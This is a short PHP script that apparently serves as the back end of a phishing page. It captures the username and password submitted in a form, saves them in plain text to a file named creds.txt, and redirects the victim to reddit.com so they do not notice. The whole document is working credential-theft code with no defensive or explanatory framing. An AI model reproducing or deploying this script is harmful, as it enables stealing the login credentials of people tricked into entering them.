<?php
file_put_contents("creds.txt", "[**] Username: " . $_POST['username'] . " Password: " . $_POST['password']);
header('Location: https://www.reddit.com/');
exit();
?>
